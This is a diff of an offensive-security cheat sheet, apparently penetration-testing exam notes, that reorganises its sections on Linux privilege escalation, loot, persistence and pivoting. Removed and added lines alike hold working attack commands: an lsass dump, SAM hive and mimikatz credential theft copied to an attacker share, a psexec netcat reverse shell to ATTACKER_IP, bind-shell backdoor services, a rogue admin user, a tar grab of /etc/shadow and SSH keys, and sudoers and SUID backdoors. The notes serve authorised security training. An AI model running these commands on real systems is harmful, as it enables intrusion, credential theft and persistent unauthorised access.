 For this to work, `sudo -l` must show that either LD_PRELOAD or LD_LIBRARY_PATH
 are inherited from the user's environment:
@@ -2892,7 +3343,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 # being called (must exactly match function signature)
 ```
 
-## 6.6. SUID binaries
+## 7.7. SUID binaries
 
 `inject.c`:
 ```c
@@ -2973,7 +3424,7 @@ which is used to display debug information (debug mode when SHELLOPTS=xtrace).
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 
-## 6.7. Using NFS for Privilege Escalation
+## 7.8. Using NFS for Privilege Escalation
 
 NFS Shares inherit the **remote** user ID, so if root-squashing is disabled,
 something owned by root remotely is owned by root locally.
@@ -2994,9 +3445,9 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-## 6.8. Linux Kernel Exploits
+## 7.9. Linux Kernel Exploits
 
-### 6.8.1. Dirty Cow Linux Privesc
+### 7.9.1. Dirty Cow Linux Privesc
 
 [CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195)
 is effective against Linux kernels 2.x through 4.x before 4.8.3.
@@ -3011,38 +3462,66 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 searchsploit -m 40839
 ```
 
-# 7. Loot
-
-## 7.1. Upgrading to Interactive Shell
-
-Use this if you have a netcat-based reverse shell (on Linux box).
+## 7.10. Linux Files of Interest
 
 ```sh
-# In reverse shell ##########
-python3 'import pty; pty.spawn("/bin/bash")'
-# windows
-c:\python27\python.exe -c 'import pty; pty.spawn("c:\windows\system32\cmd.exe")'
-
-# Ctrl-Z, jumps you back to local shell by backgrounding reverse shell
-
-# In local shell ##########
-# Get TTY rows/cols for later:
-stty size # prints "rows cols"
-# ignore hotkeys in the local shell and get back to remote shell
-stty raw -echo; fg # hit enter TWICE after this
-
-# In reverse shell ##########
-# set correct size for remote shell (ROWS and COLS from stty size)
-stty rows ROWS cols COLS
-# enable terminal colors
-export TERM=xterm-256color
-# reload bash to apply TERM env var
-exec /bin/bash
+# quick command to grab the goods
+tar zcf loot.tar.gz \
+/etc/passwd{,-} \
+/etc/shadow{,-} \
+/etc/ssh/ssh_config \
+/etc/ssh/sshd_config \
+/home/*/.ssh/id* \
+/home/*/.ssh/authorized_keys* \
+/home/*/.gnupg \
+/root/.gnupg \
+/root/.ssh/id* \
+/root/.ssh/authorized_keys* \
+/root/network-secret*.txt \
+/root/proof.txt
 ```
 
-## 7.2. File Transfers
+## 7.11. Data Wrangling on Linux
 
-### 7.2.1. Netcat transfer
+Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
+be able to quickly sift through it to get the parts you care about.
+
+### 7.11.1. Awk & Sed
+
+```sh
+# grab lines of text between start and end delimiters.
+awk '/PAT1/,/PAT2/' # includes start and end lines
+awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
+sed -n '/PAT1/,/PAT2/{//!p;}' FILE
+sed '/PAT1/,/PAT2/!d;//d' FILE
+```
+
+## 7.12. Linux Persistence
+
+### 7.12.1. Grant passwordless sudo access
+
+Edit the `/etc/sudoers` file to have the following line:
+
+```
+myuser ALL=(ALL) NOPASSWD: ALL
+```
+
+### 7.12.2. Setting SUID bit
+
+If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
+or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
+you can use those to give yourself a root shell. This is a kind of privesc
+backdoor.
+
+```sh
+sudo chmod u+s /bin/sh
+```
+
+# 8. Loot
+
+## 8.1. File Transfers
+
+### 8.1.1. Netcat transfer
 
 ```sh
 # start listening for download on port 9001
@@ -3051,7 +3530,7 @@ nc -nlvp 9001 > dump.txt
 nc $IP 9001 < file.txt
 ```
 
-### 7.2.2. Curl transfers
+### 8.1.2. Curl transfers
 
 ```sh
 # upload a file with curl (POST multipart/form-data)
@@ -3059,7 +3538,7 @@ nc $IP 9001 < file.txt
 curl -v -F key1=value1 -F upload=@localfilename URL
 ```
 
-### 7.2.3. PowerShell File Transfers
+### 8.1.3. PowerShell File Transfers
 
 ```powershell
 # Download to Windows victim
@@ -3072,14 +3551,14 @@ invoke-webrequest -uri http://ATTACKER/rsh.exe -out c:\users\public\rsh.exe
 (New-Object System.Net.WebClient).UploadFile('http://192.168.119.144/upload.php','somefiile')
 ```
 
-### 7.2.4. Mount NFS Share
+### 8.1.4. Mount NFS Share
 
 ```sh
 # try without vers=3 if mount fails. Also try with vers=2
 mount -t nfs -o vers=3 REMOTE_IP:/home/ /mnt/nfs-share
 ```
 
-### 7.2.5. SMB Share
+### 8.1.5. SMB Share
 
 Mounting/hosting share on Kali
 ```sh
@@ -3104,7 +3583,7 @@ smbclient //$VICTIM_IP/SHARENAME
 > mget *
 ```
 
-### 7.2.6. FTP Server on Kali
+### 8.1.6. FTP Server on Kali
 
 ```sh
 # install pyftpdlib for root to use port 21
@@ -3159,7 +3638,7 @@ chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
 
-### 7.2.7. SSHFS
+### 8.1.7. SSHFS
 
 To make things easier, set up a config file like so:
 
@@ -3179,7 +3658,7 @@ Then mount the filesystem with root access:
 sshfs -F/full/path/to/ssh-config alpha:/ ./rootfs
 ```
 
-### 7.2.8. Windows LOLBAS File Downloads
+### 8.1.8. Windows LOLBAS File Downloads
 
 ```bat
 :: Download 7zip binary to ./7zip.exe, using urlcache or verifyctl
@@ -3196,7 +3675,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://7-zip.org/
 powershell iwr -uri http://7-zip.org/a/7z1604-x64.exe -outfile 7zip.exe
 ```
 
-### 7.2.9. PHP File Uploads
+### 8.1.9. PHP File Uploads
 
 Uploading files via HTTP POST to `upload.php`:
 
@@ -3254,393 +3733,61 @@ max_execution_time = 120  # allow uploads to take 2 minutes
 
 **Note:** The .user.ini file goes in your site’s document root.
 
-## 7.3. Grabbing Passwords
-
-Encrypted passwords can often be recovered with tools like [NirSoft](http://www.nirsoft.net/password_recovery_tools.html)
-
-### 7.3.1. Finding Windows Passwords
-
-```bat
-:: search specific filetypes for "password"
-findstr /spin password *.txt *.xml *.ini *.config
-
-:: Searching all files (lots of output)
-findstr /spin "password" *.*
-
-:: find files that might have credentials in them
-cd \ && dir /b /s *vnc.ini Groups.xml sysprep.* Unattend.* Unattended.*
-dir /b /s *passw* *creds* *credential*
-dir /b /s *.config *.conf *.cfg
-```
-
-### 7.3.2. Windows Passwords in Registry
-```bat
-:: Windows autologin credentials (32-bit and 64-bit versions)
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /reg:64 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"
-
-:: VNC
-reg query "HKCU\Software\ORL\WinVNC3\Password"
-reg query "HKCU\Software\TightVNC\Server"
-
-:: SNMP Paramters
-reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
-
-:: Putty
-reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
-
-:: Search for password in registry
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-```
-
-### 7.3.3. Files with Passwords on Windows
-
-Some of these passwords are cleartext, others are base64-encoded. Groups.xml has
-an AES-encrypted password, but the static key is published on the MSDN website.
-
-```bat
-type c:\sysprep.inf
-type c:\sysprep\sysprep.xml
-type %WINDIR%\Panther\Unattend\Unattended.xml
-type %WINDIR%\Panther\Unattended.xml
-type %WINDIR%\SYSVOL\Groups.xml
-```
-
-To decrypt the Groups.xml password: `gpp-decrypt encryptedpassword`
-
-### 7.3.4. Getting Saved Wifi Passwords on Windows
-
-```bat
-:: show all saved wifi networks
-netsh wlan show profiles
-
-:: get password of specific network 'profilename'
-wlan show profile profilename key=clear
-
-:: PEAP wifi network passwords are stored in registry
-reg save 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hklm.hiv
-reg save 'HKCU\Software\Microsoft\Wlansvc\UserData\Profiles' peap-profiles-hkcu.hiv
-
-:: Display all keys, values and data under the PEAP profiles:
-reg query 'HKLM\Software\Microsoft\Wlansvc\UserData\Profiles' /s /f *
-```
-
-### 7.3.5. Dumping Hashes from Windows
-
-```bat
-:: Grab them from the registry
-reg save hklm\sam %TEMP%\sam.hiv /y
-reg save hklm\system %TEMP%\system.hiv /y
-reg save hklm\security %TEMP%\security.hiv /y
-copy %TEMP%\sam.hiv \\192.168.119.144\share
-copy %TEMP%\system.hiv \\192.168.119.144\share
-copy %TEMP%\security.hiv \\192.168.119.144\share
-
-:: clean up stolen registry files
-del %TEMP%\*.hiv
-
-:: Grab the backups from disk
-copy %WINDIR%\repair\sam \\192.168.119.144\share\sam-repair.hiv
-copy %WINDIR%\repair\system \\192.168.119.144\share\system-repair.hiv
-copy %WINDIR%\repair\security \\192.168.119.144\share\security-repair.hiv
-```
-
-Then, on attack box:
-```sh
-# using impacket secretsdump.py (security.hiv optional)
-impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv -outputfile secretsdump LOCAL
-```
-
-Alternatively, you can grab the hashes directly from LSASS.exe memory using
-Sysinternals tools:
-```bat
-procdump64.exe -accepteula -ma lsass.exe %TEMP%\lsass.mem
-copy %TEMP%\lsass.mem \\192.168.119.144\share
-```
-
-#### 7.3.5.1. Dumping Hashes from Windows Domain Controller
-
-DCSync Attack
-
-```sh
-# requires authentication
-impacket-secretsdump -just-dc-ntlm -outputfile secretsdump DOMAIN/username:Password@DC_IP_or_FQDN
-```
-
-### 7.3.6. Using mimikatz to dump hashes and passwords
-
-[PayloadsAllTheThings: Mimikatz](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
-
-```bat
-.\mimikatz.exe
-:: enable full debug privileges to have access to system memory
-privilege::debug
-:: elevate to system
-token::elevate
-:: get hashes and try to print plaintext passwords
-sekurlsa::logonpasswords
-:: tries to extract plaintext passwords from lsass memory
-sekurlsa::wdigest
-:: dump hashes from SAM
-lsadump::sam
-:: list all available kerberos tickets
-sekurlsa::tickets
-:: Get just the krbtgt kerberos tikcket
-sekurlsa::krbtgt
-:: List Current User's kerberos tickets
-kerberos::list
-
-:: get google chrome saved credentials
-dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
-dpapi::chrome /in:"c:\users\administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
-```
-
-## 7.4. Windows Files of Interest
-
-```bat
-:: GPG keys
-dir /s /b /a C:\users\*.gpg
-:: usually under C:\Users\*\AppData\Roaming\gnupg\
-
-:: KeePass databases:
-dir *.kdb /a /b /s
-
-:: containing plaintext, encoded, or hashed credentials
-%SYSTEMDRIVE%\unattend.txt
-%SYSTEMDRIVE%\sysprep.inf
-%SYSTEMDRIVE%\sysprep\sysprep.xml
-%SYSTEMDRIVE%\pagefile.sys
-%WINDIR%\debug\NetSetup.log
-%WINDIR%\repair\sam
-%WINDIR%\repair\system
-%WINDIR%\repair\software
-%WINDIR%\repair\security
-%SYSTEMROOT%\ntds\ntds.dit
-%WINDIR%\iis6.log
-%WINDIR%\system32\config\AppEvent.Evt
-%WINDIR%\system32\config\SecEvent.Evt
-%WINDIR%\system32\config\default.sav
-%WINDIR%\system32\config\security.sav
-%WINDIR%\system32\config\software.sav
-%WINDIR%\system32\config\system.sav
-%WINDIR%\system32\CCM\logs\*.log
-%USERPROFILE%\ntuser.dat
-%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
-%WINDIR%\System32\drivers\etc\hosts
-```
-
-## 7.5. Linux Files of Interest
-
-```sh
-# quick command to grab the goods
-tar zcf loot.tar.gz \
-/etc/passwd{,-} \
-/etc/shadow{,-} \
-/etc/ssh/ssh_config \
-/etc/ssh/sshd_config \
-/home/*/.ssh/id* \
-/home/*/.ssh/authorized_keys* \
-/home/*/.gnupg \
-/root/.gnupg \
-/root/.ssh/id* \
-/root/.ssh/authorized_keys* \
-/root/network-secret*.txt \
-/root/proof.txt
-```
-
-## 7.6. Data Wrangling on Linux
-
-Sometimes there is a lot of extra garbage in the loot you grab. It's nice to
-be able to quickly sift through it to get the parts you care about.
-
-### 7.6.1. Awk & Sed
-
-```sh
-# grab lines of text between start and end delimiters.
-awk '/PAT1/,/PAT2/' # includes start and end lines
-awk '/PAT1/{flag=1; next} /PAT2/{flag=0} flag' FILE  # omits delims
-sed -n '/PAT1/,/PAT2/{//!p;}' FILE
-sed '/PAT1/,/PAT2/!d;//d' FILE
-```
-
-# 8. Windows Persistence
-
-## 8.1. Remote SYSTEM Backdoor
-
-These techniques require having Admin credentials for the target machine.
-
-### 8.1.1. Using Windows Services
-
-```bat
-:: You must establish SMB session with admin creds first!!
-net use \\VICTIM_NAME [PASSWORD] /u:Administrator
-:: or mount an smb share on the target:
-net use * \\VICTIM_NAME\[share] [PASSWORD] /u:Administrator
-
-:: open a backdoor netcat bind-shell with system privileges on a remote host
-sc \\VICTIM_NAME create scvhost binpath= "cmd.exe /k %temp%\nc.exe -l -p 22222 -e cmd.exe"
-
-:: start the service
-sc \\VICTIM_NAME start scvhost
-
-:: delete the service
-sc \\VICTIM_NAME delete scvhost
-```
-
-### 8.1.2. Using PSExec
-
-NOTE: SysInternals PSExec leaves a copy of the service on the machine after
-you run it, which you must manually remove with `sc \\VICTIM_NAME delete psexec`.
-The Metasploit module and nmap NSE script clean up the service for you.
-
-```bat
-:: '-c' passes copy of command to remote systsem even if not already present
-:: '-s' runs command as systsem
-:: '-d' runs command in detached mode. Use if you want PSExec to run something
-:: in the background (won't wait for process to finish, nor passs input/output
-:: back to caller).
-psexec \\VICTIM_IP -c -s -d -u Administrator -p password "nc.exe -n ATTACKER_IP -e cmd.exe"
-:: If username and password are omitted, psexec uses current user's creds on
-:: the remote machine.
-```
-
-### 8.1.3. Using Scheduled Tasks
-
-```bat
-:: schtasks ("/ru system" runs as system)
-schtasks /create /tn TASKNAME /s VICTIM_IP /u Administrator /p password /sc FREQUENCY /st HH:MM:SS /sd MM/DD/YYY /ru system /tr COMMAND
-:: frequency: once, minute, hourly, daily, weekly, monthly, onstart, onlogon, onidle
-
-:: query schtasks
-schtasks /query /s VICTIM_IP
-
-:: delete schtask ('/f' to force)
-schtasks /delete /s VICTIM_IP /u Administrator /p password /tn TASKNAME
-
-:: at (deprecated on newer machines, but still should work)
-at \\VICTIM_IP HH:MM[A|P] COMMAND
-
-:: query at
-at \\VICTIM_IP
-```
-
-## 8.2. Remote Admin Backdoor via WMIC
-
-```bat
-:: create admin bind-shell backdoor. Use '-d' for it to run without window
-wmic process call create "%temp%\nc.exe -dlp 22222 -e cmd.exe"
-
-:: delete the wmic process
-wmic process where name="nc.exe" delete
-```
-
-## 8.3. Add RDP User
-
-```bat
-net user hacker P@$$w0rd /add
-net localgroup Administrators hacker /add
-net localgroup "Remote Desktop Users" hacker /ADD
-:: enable remote desktop
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-:: delete user
-net user hacker /del
-:: disable remote desktop
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
-```
-
-## 8.4. Connect to Windows RDP
-
-```sh
-xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP
-# to attach a drive, use:
-# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot
-```
-
-## 8.5. Change Windows Domain Credentials
-
-If you want to change the password of a user on a windows domain:
-
-```powershell
-Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
-```
-
-## 8.6. Create Windows Backdoor Service
-
-```bat
-:: Creates a SYSTEM bind-shell listening on port 54321
-sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\nc.exe -d -L -p 54321 -e c:\windows\system32\cmd.exe"
-sc create bdsvc binpath= "c:\windows\system32\cmd.exe /k c:\users\public\ncat.exe -lk -p 54321 -e c:\windows\system32\cmd.exe"
-:: Alternative: add \\computername after sc to do it remotely
-
-:: start backdoor service
-sc start bdsvc
-:: or
-net start bdsvc
-
-:: stop and delete backdoor service
-sc delete bdsvc
-```
-
-# 9. Linux Persistence
-
-## 9.1. Grant passwordless sudo access
-
-Edit the `/etc/sudoers` file to have the following line:
-
-```
-myuser ALL=(ALL) NOPASSWD: ALL
-```
-
-## 9.2. Setting SUID bit
-
-If you set the SUID bit of a root-owned executable, like `/bin/sh` or `less`
-or `find` (see [GTFOBins](https://gtfobins.github.io/#+shell) for more),
-you can use those to give yourself a root shell. This is a kind of privesc
-backdoor.
-
-```sh
-sudo chmod u+s /bin/sh
-```
-
-# 10. Pivoting and Redirection
+# 9. Pivoting and Redirection
 
 These are techniques for "traffic bending" or "traffic shaping" or
 "tunneling traffic" or "port redirection" or "port forwarding".
 
-## 10.1. SSH Tunnels
+## 9.1. SSH Tunnels
 
-Before starting, it is best to have the following settings enabled in your
+Before starting, it is best to have the following settings enabled in the jumpbox
 `/etc/ssh/sshd_config` file.
 
 ```ini
-# Specifies that remote hosts are allowed to connect to local forwarded ports.
+# In order to leverage -R remote port forwards, set the following:
 GatewayPorts clientspecified
 
 # Allow TCP forwarding (local and remote)
 AllowTcpForwarding yes
 ```
 
+After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.
+
+```bash
+# View the SSH server status.
+systemctl status ssh
+
+# Restart the SSH server.
+systemctl restart ssh
+
+# Stop the SSH server.
+systemctl stop ssh
+
+# Start the SSH server.
+systemctl start ssh
+```
+
 Here are common tunneling commands (using `-g` flag forces the ssh option
-`GatewayPorts` to yes, and is good practice when using `-R/-L/-D`):
+`GatewayPorts` to yes, and is good practice when using `-R`):
 
 ```sh
 ## Local Forwarding ###################################
 # SSH local port forward to reach internal_server_ip:port via jumpbox_ip
-ssh tunneler@jumpbox_ip -p 2222 -gL 4445:internal_server_ip:445
+ssh jumper@jumpbox_ip -p 2222 -L 4445:internal_server_ip:445
 # Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
 # internal_server_ip, which is only reachable from jumpbox_ip
 
 # SSH local port forward to send traffic from our local port 8080 to victim's
 # port 80 (to get around firewall restrictions that don't allow remote
 # connections to that port, but allow us to ssh in)
-ssh victim@$VICTIM_IP -gL 8080:localhost:80
+ssh victim@$VICTIM_IP -L 8080:localhost:80
 # Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable
 # from the outside
 
+
 ## Remote Forwarding #################################
 # forward traffic to redirector's port 80 to your local listener on port 8080
-ssh redirector@jumpbox_ip -gR 80:localhost:8080
+ssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080
 # now reverse shells pointed to the jumpbox_ip:80 will hit your local listener
 
 # Connecting from jumpbox->attacker to give attacker access to
@@ -3650,10 +3797,24 @@ ssh attacker@attacker_ip -gR 4445:internal_server_ip:445
 # internal_server_ip, which is only reachable from jumpbox_ip, getting around
 # firewall rules that also prevent inbound ssh connections
 
-## Dynamic forwarding (SOCKS5) #######################
-# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip
-ssh tunneler@server_ip -p 2222 -gD 1080
-# next config proxychains socks5 localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from server_ip only
+
+## Complex example: Throwing Eternal Blue through firewall ##################################
+# Local forward to victim's SMB & WinRPC ports, remote forward meterpreter callback to attacker
+ssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \
+-R 4444:localhost:4444
+# The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.
+
+
+## Dynamic forwarding (SOCKS4/5) #######################
+# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox
+ssh jumper@jumpbox_ip -p 2222 -D 1080
+# Next config /etc/proxychains4.conf: socks5 localhost 1080
+# Then: proxychains curl http://any_internal_server_ip/
+# curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.
+# Look at their help to see how to use the feature.
+# e.g.
+curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
+# You can also set up firefox to browse through SOCKS proxy through GUI settings
 
 # to proxy DNS through the new SSH SOCKS tunnel, set the following line in
 # /etc/proxychains4.conf:
@@ -3661,45 +3822,88 @@ proxy_dns
 # and set the following env variable:
 export PROXYRESOLVE_DNS=REMOTE_DNS_SVR
 
+
 ## ProxyJump ########################################
 # ProxyJump lets you nest ssh connections to reach remote internal networks/hosts
-# ProxyJump ssh to an internal_host via ssh server_ip
-ssh -J tunneler@server_ip:2222 remoteuser@internal_host # which is only accessible from server_ip
+# Here we chain ssh connections like so: jumpbox1_ip -> jumpbox2_ip -> internal_host,
+# where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1
+ssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host
 
-# Chain ProxyJump + dynamic port forward to create a proxy of 2nd_box which is only accessible via 1st_box
-ssh -J firstuser@1st_box:2222 seconduser@2nd_box -gD 1080
+# Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip
+ssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080
 # next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only
+
 
 ## Miscellaneous ###################################
 # bypass first time prompt when have non-interactive shell
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...
 ```
 
-When using ProxyJump, it is easier to use if you set up `ssh_config`
-appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464)
-for how to do it.
+When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config`
+appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:
+
+```
+Host jumpbox1
+    HostName 10.1.1.100
+    Port 22
+    User jumper1
+    IdentityFile /home/user/.ssh/id_rsa_jump1
+Host jumpbox2
+    HostName 10.2.2.100
+    Port 22
+    User jumper2
+    IdentityFile /home/user/.ssh/id_rsa_jump2
+    ProxyJump jumpbox1
+Host jumpbox3
+    HostName 10.3.3.100
+    Port 22
+    User jumper3
+    IdentityFile /home/user/.ssh/id_rsa_jump3
+    ProxyJump jumpbox2
+Host target
+    HostName 10.4.4.100
+    Port 22
+    User target
+    IdentityFile /home/user/.ssh/id_rsa_target
+    ProxyJump jumpbox3
+    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine
+    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306
+    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node
+```
 
 You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
-[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling)
-for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).
+[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling) for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).
 
-**PRO TIP**: If setting up a remote ssh tunnel to forward web traffic, use the
+**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the
 following flags: `-fNTgR`.
 
-- `-f` forks the command into the background after
-connection is established so you can keep using the terminal.
+- `-f` forks the ssh process into the background after
+connection is established so you can keep using your terminal.
 - `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
   Using these together prevents command execution on the remote host (jump box)
 - `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding
 
+### 9.1.1. Ad Hoc SSH Port Forwards
+
+TL;DR:
+
+```
+<ENTER><ENTER>~C
+help
+```
+
 `ssh` also has an open command line mode to add or delete **ad hoc port forwards**. This can
-be summoned by typing the `shift ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to
+be summoned by typing the `<shift> ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to
 note is that the `~C` is only recognized after a new line, so be sure to hit Enter a few times before
 typing in the key sequence. It likes to be called from a pure blinking command prompt that hasn’t
 been "dirtied" by, for example, typing something, then deleting it. So just be sure to hit Enter a
 few times before trying to drop into the SSH open command line mode.
 
-## 10.2. SOCKS Proxies and proxychains
+The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.
+
+Typing `help` in ad hoc command line mode shows command syntax examples.
+
+## 9.2. SOCKS Proxies and proxychains
 
 `proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
 what `ssh -D` and `chisel -D` give you).
@@ -3714,7 +3918,7 @@ sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
 sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP
 ```
 
-## 10.3. Bending with iptables
+## 9.3. Bending with iptables
 
 Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
 host to your desired remote host. Note, it's usually also good practice to
@@ -3746,7 +3950,7 @@ sudo service iptables-persistent save
 
 
 
-## 10.4. Bending with socat
+## 9.4. Bending with socat
 
 On the jump-box:
 
@@ -3777,9 +3981,7 @@ socat [options] <address> <address>
 Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`
 
 Other useful addresses:
- - `STDIN` (equivalently, `-`)
- - `STDOUT`
- - `STDIO` (both stdin and stdout)
+ - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
  - `EXEC:cmdline` or `SYSTEM:shell-cmd`
  - `FILE:/path/to/file` - log output to file
  - `FILE:$(tty),rawer` - a raw terminal
@@ -3790,10 +3992,10 @@ Other useful addresses:
  - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
  - `PIPE` or `PIPE:filename`
 
-## 10.5. Bending with rinetd
+## 9.5. Bending with rinetd
 
 Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the
-config settings in `/etc/rinetd.conf`.
+config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.
 
 Redirection rules are in the following format:
 
@@ -3806,7 +4008,7 @@ configuration file without interrupting existing connections. Under Linux
 the process id is saved in the file `/var/run/rinetd.pid` to facilitate the
 `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.
 
-## 10.6. Bending with netsh
+## 9.6. Bending with netsh
 
 If you own a dual-homed internal Windows box that you want to pivot from, you
 can set up port forwarding using the `netsh` utility.
@@ -3825,7 +4027,7 @@ netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33306 conn
 netsh advfirewall firewall add rule name="fwd_4445_rule" protocol=TCP dir=in localip=WIN_EXT_IP localport=4445 action=allow
 ```
 
-## 10.7. Bending with sshuttle
+## 9.7. Bending with sshuttle
 
 [Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that
 handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently
@@ -3836,14 +4038,26 @@ route all traffic to a target internal subnet easily.
 sshuttle --dns -r user@jumpbox_ip 10.1.1.0/0
 ```
 
-## 10.8. Bending with chisel
+## 9.8. Bending with chisel
 
 [Chisel](https://github.com/jpillora/chisel) lets you securely tunnel through
 firewalls and set up a SOCKS proxy through your tunnel.
 
-[Usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
+[Basic SOCKS usage](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)
 
-## 10.9. Bending with netcat
+```bash
+# on attack box:
+./chisel server -p 8080 --reverse
+
+# on jumpbox (Windows example)
+chisel-x64.exe client attacker_ip:8080 R:socks
+
+# then use proxychains from attack box like normal
+```
+
+[Full documentation/repo](https://github.com/jpillora/chisel)
+
+## 9.9. Bending with netcat
 
 ```bat
 :: WINDOWS pivot
@@ -3861,9 +4075,9 @@ mkfifo /tmp/bp  # backpipe
 nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
 ```
 
-# 11. Miscellaneous
+# 10. Miscellaneous
 
-## 11.1. Disable SSH Host Key Checking
+## 10.1. Disable SSH Host Key Checking
 
 Put this at the top of your `~/.ssh/config` to disable it for all hosts:
 
@@ -3875,7 +4089,7 @@ Host *
 
 or use these flags with ssh: `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null`
 
-## 11.2. Use Legacy Key Exchange Algorithm or Cipher with SSH
+## 10.2. Use Legacy Key Exchange Algorithm or Cipher with SSH
 
 If you try to ssh onto a host and get an error like:
 
@@ -3895,14 +4109,14 @@ Unable to negotiate with 10.11.1.115 port 22: no matching cipher found. Their of
 
 You can get around this by adding the `-c aes256-cbc` flag to your ssh command. Again, be sure to use one of the ciphers listed in their offer.
 
-## 11.3. Convert text to Windows UTF-16 format on Linux
+## 10.3. Convert text to Windows UTF-16 format on Linux
 
 ```sh
 # useful for encoding a powershell command in base64
 echo "some text" | iconv -t UTF-16LE
 ```
 
-## 11.4. Extract UDP pcap packet payload data
+## 10.4. Extract UDP pcap packet payload data
 
 Using scapy:
 
